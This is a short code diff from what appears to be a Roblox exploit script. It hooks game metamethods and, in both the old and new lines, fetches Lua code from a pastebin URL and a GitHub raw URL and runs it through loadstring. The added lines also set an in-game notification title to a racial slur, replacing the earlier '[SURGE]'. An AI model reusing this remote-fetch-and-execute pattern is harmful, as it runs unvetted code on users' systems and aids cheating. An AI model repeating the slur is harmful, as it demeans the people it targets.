@@ -384,8 +384,8 @@ getgenv().hookmetamethod = newcclosure(function(obj, method, rep)
     return old
 end)
 
-loadstring(game:HttpGet('https://pastebin.com/raw/5LGTLMg3'))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PSWalloz/23ergtfb/refs/heads/main/DDD.lua"))()
+loadstring(httpget('https://pastebin.com/raw/5LGTLMg3'))()
+loadstring(httpget("https://raw.githubusercontent.com/PSWalloz/23ergtfb/refs/heads/main/DDD.lua"))()
 
 game:GetService("StarterGui"):SetCore("SendNotification",{
     Title = "niggers",-- OLD WAS "[SURGE]"
